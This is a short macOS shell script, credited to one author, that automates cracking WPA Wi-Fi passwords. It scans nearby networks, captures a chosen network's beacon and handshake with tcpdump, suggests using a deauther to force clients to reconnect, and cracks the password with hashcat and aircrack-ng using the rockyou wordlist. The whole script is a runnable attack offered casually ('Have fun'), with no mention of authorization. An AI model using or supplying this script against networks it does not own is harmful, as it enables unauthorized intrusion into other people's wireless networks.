#Made by Altair933

#Disconectiong the wifi network
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z

#Scanning the networks around
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s

#Asking what BSSID you want to sniff packets off of
echo "What is the BSSID of the Wifi network?"
read x

#Asking what channel you want to sniff packets off of
echo "What is the channel?"
read s

#Changing the Chanel to what you put before
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -c$s

#Getting a beacon
sudo tcpdump "type mgt subtype beacon and ether src $x" -I -c 1 -i en0 -w handshakes/beacon.cap

echo "Now you just have to wait until someone connects to the network. Or if you have a deauther that would be a good time to use it. Have fun :)"

#Getting the handshake
sudo tcpdump "ether proto 0x888e and ether host $x" -I -U -vvv -i en0 -w handshakes/handshake.cap

#Merging the handshake and the beaon to make a new file (a capture)
mergecap -a -F pcap -w handshakes/capture.cap handshakes/beacon.cap handshakes/handshake.cap

#removing the default beacon and handshake .cap files
rm handshakes/handshake.cap handshakes/beacon.cap

#changing the file so hashcat can read it
cap2hccapx handshakes/capture.cap handshakes/capture.hccapx

#Crackong the password with hashcat
sudo hashcat/hashcat -m 2500 handshakes/capture.hccapx rockyou.txt

#clear screen
printf '\33c\e[3J'

#Show the password
sudo hashcat/hashcat -m 2500 handshakes/capture.hccapx rockyou.txt --show

aircrack-ng handshakes/capture.cap -w rockyou.txt
